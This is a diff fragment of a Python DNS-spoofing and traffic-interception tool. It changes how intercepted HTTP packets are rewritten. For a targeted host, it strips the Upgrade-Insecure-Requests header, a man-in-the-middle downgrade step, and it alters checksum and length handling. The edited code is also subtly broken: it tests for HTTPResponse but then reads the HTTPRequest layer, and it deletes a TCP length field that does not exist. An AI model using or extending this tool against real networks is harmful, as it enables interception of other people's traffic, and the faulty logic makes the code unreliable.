@@ -52,15 +52,15 @@ class Dns_spoof:
                 return False
             packet.summary()
             bin_packet.set_payload(bytes(packet))
-        elif packet.haslayer(HTTPRequest):
+        elif packet.haslayer(HTTPResponse):
             try:
                 httpHost = packet[HTTPRequest].Host.decode()
                 if self.host[0] in httpHost:
                     del packet[HTTPRequest].Upgrade_Insecure_Requests
                     del packet[IP].len
                     del packet[IP].chksum
-                    del packet[UDP].len
-                    del packet[UDP].chksum
+                    del packet[TCP].len
+                    del packet[TCP].chksum
             except IndexError as error:
                 return False
             packet.summary()
